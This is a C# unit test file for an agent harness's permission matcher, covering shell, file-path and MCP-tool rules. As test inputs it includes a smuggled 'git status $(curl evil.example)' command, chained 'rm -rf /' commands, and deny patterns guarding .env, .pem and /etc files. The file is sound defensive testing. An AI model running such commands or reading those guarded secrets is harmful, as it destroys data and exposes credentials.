using BlazeHarness.Core.Permissions;

namespace BlazeHarness.Core.Tests.Unit.Permissions;

public sealed class RuleMatcherTests
{
    [Theory]
    [InlineData("git push*", "git push origin main", true)]
    [InlineData("git push*", "git pull", false)]
    [InlineData("git push*", "echo hi && git push", true)]
    [InlineData("npm run ?", "npm run b", true)]
    [InlineData("npm run ?", "npm run build", false)]
    [InlineData("rm -rf *", "ls; rm -rf build", true)]
    public void ForCommand_DenyRule_MatchesWholeCommandOrAnyPart(string pattern, string command, bool expected)
    {
        // Act
        var rule = RuleMatcher.ForCommand([Shell(PermissionVerdict.Deny, pattern)], command);

        // Assert
        (rule is not null).Should().Be(expected);
    }

    [Fact]
    public void ForCommand_AllowRule_NeedsEveryPartToMatch()
    {
        // Arrange
        PermissionRule[] rules = [Shell(PermissionVerdict.Allow, "git status*")];

        // Assert
        RuleMatcher.ForCommand(rules, "git status -s").Should().NotBeNull();
        RuleMatcher.ForCommand(rules, "git status && rm -rf /").Should().BeNull();
    }

    [Fact]
    public void ForCommand_AllowRule_IgnoresACommandItCannotRead()
    {
        // Arrange
        PermissionRule[] rules = [Shell(PermissionVerdict.Allow, "git status*")];

        // Act
        var rule = RuleMatcher.ForCommand(rules, "git status $(curl evil.example)");

        // Assert
        rule.Should().BeNull();
    }

    [Fact]
    public void ForCommand_LaterRule_Wins()
    {
        // Arrange
        var allow = Shell(PermissionVerdict.Allow, "git *");
        var ask = Shell(PermissionVerdict.Ask, "git push*");

        // Act
        var rule = RuleMatcher.ForCommand([allow, ask], "git push");

        // Assert
        rule.Should().Be(ask);
    }

    [Fact]
    public void ForCommand_RefuseRule_BeatsALaterAllow()
    {
        // Arrange
        var deny = Shell(PermissionVerdict.Deny, "git push*");
        var allow = Shell(PermissionVerdict.Allow, "git *");

        // Act
        var rule = RuleMatcher.ForCommand([deny, allow], "git push");

        // Assert
        rule.Should().Be(deny);
    }

    [Fact]
    public void ForCommand_FileRule_IsNotUsed()
    {
        // Act
        var rule = RuleMatcher.ForCommand([File(PermissionVerdict.Deny, "*")], "ls");

        // Assert
        rule.Should().BeNull();
    }

    [Theory]
    [InlineData("**/.env", "/work/.env", true)]
    [InlineData("**/.env", "/work/app/config/.env", true)]
    [InlineData("**/.env", "/work/.env.example", false)]
    [InlineData("*.pem", "/work/key.pem", true)]
    [InlineData("*.pem", "/work/keys/key.pem", false)]
    [InlineData("secrets/**", "/work/secrets/a/b.txt", true)]
    [InlineData("secrets/**", "/work/other/secrets/a.txt", false)]
    [InlineData("/etc/**", "/etc/hosts", true)]
    [InlineData("a?.txt", "/work/ab.txt", true)]
    [InlineData("a?.txt", "/work/abc.txt", false)]
    public void ForPaths_Pattern_MatchesRelativeOrFullPath(string pattern, string path, bool expected)
    {
        // Act
        var rule = RuleMatcher.ForPaths([File(PermissionVerdict.Deny, pattern)], [path], "/work");

        // Assert
        (rule is not null).Should().Be(expected);
    }

    [Fact]
    public void ForPaths_AllowRule_NeedsEveryPathCovered()
    {
        // Arrange
        PermissionRule[] rules = [File(PermissionVerdict.Allow, "docs/**")];

        // Assert
        RuleMatcher.ForPaths(rules, ["/work/docs/a.md"], "/work").Should().NotBeNull();
        RuleMatcher.ForPaths(rules, ["/work/docs/a.md", "/work/src/b.cs"], "/work").Should().BeNull();
        RuleMatcher.ForPaths(rules, [], "/work").Should().BeNull();
    }

    [Fact]
    public void ForPaths_OnePathRefused_RefusesTheCall()
    {
        // Arrange
        PermissionRule[] rules = [File(PermissionVerdict.Allow, "**"), File(PermissionVerdict.Deny, "**/.env")];

        // Act
        var rule = RuleMatcher.ForPaths(rules, ["/work/a.txt", "/work/.env"], "/work");

        // Assert
        rule.Should().NotBeNull();
        rule.Action.Should().Be(PermissionVerdict.Deny);
    }

    [Theory]
    [InlineData("files/read", true)]
    [InlineData("files/*", true)]
    [InlineData("*/read", true)]
    [InlineData("*", true)]
    [InlineData("files/rea?", true)]
    [InlineData("files/write", false)]
    [InlineData("other/*", false)]
    [InlineData("file/*", false)]
    public void ForMcpTool_Pattern_MatchesServerSlashTool(string pattern, bool expected)
    {
        // Act
        var rule = RuleMatcher.ForMcpTool([Mcp(PermissionVerdict.Ask, pattern)], "files", "read");

        // Assert
        (rule is not null).Should().Be(expected);
    }

    [Fact]
    public void ForMcpTool_DenyAndAllowBothMatch_Denies()
    {
        // Arrange
        PermissionRule[] rules = [Mcp(PermissionVerdict.Deny, "files/*"), Mcp(PermissionVerdict.Allow, "*")];

        // Act
        var rule = RuleMatcher.ForMcpTool(rules, "files", "read");

        // Assert
        rule.Should().NotBeNull();
        rule.Action.Should().Be(PermissionVerdict.Deny);
    }

    [Fact]
    public void ForMcpTool_RulesForOtherTargets_AreIgnored()
    {
        // Act
        var rule = RuleMatcher.ForMcpTool([Shell(PermissionVerdict.Deny, "*"), File(PermissionVerdict.Deny, "**")], "files", "read");

        // Assert
        rule.Should().BeNull();
    }

    private static PermissionRule Mcp(PermissionVerdict action, string pattern) => new(RuleTarget.McpTool, action, pattern);

    private static PermissionRule Shell(PermissionVerdict action, string pattern) => new(RuleTarget.ShellCommand, action, pattern);

    private static PermissionRule File(PermissionVerdict action, string pattern) => new(RuleTarget.FilePath, action, pattern);
}
